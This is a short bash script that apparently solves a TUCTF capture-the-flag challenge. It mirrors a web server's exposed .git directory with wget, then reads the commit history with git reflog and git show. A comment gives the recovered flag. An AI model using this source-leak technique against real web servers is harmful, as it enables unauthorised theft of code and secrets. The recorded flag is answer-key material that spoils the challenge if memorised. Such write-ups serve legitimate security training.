#!/bin/bash

wget -drc http://gitgud.tuctf.com/.git/
git reflog
git show 08cd273

#flag was: TUCTF{D0nt_Us3_G1t_0n_Web_S3rv3r}
